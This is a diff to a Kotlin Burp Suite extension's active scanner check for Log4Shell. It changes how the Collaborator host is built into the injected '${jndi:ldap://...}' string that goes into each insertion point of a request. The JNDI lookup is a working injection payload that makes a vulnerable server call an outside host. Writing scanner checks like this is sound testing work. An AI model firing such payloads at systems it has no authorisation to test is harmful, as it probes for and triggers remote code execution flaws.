@@ -42,8 +42,8 @@ class BurpExtender : IBurpExtender, IScannerCheck {
             Collections.emptyList() // not relevant
 
     override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
-        val payload = collaborator.generatePayload(true)
-        val bytes = "\${jndi:ldap://$payload/s2test}".toByteArray()
+        val payload = collaborator.generatePayload(false)
+        val bytes = "\${jndi:ldap://$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
         val request = insertionPoint!!.buildRequest(bytes)
         val poff = insertionPoint.getPayloadOffsets(bytes)
         val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
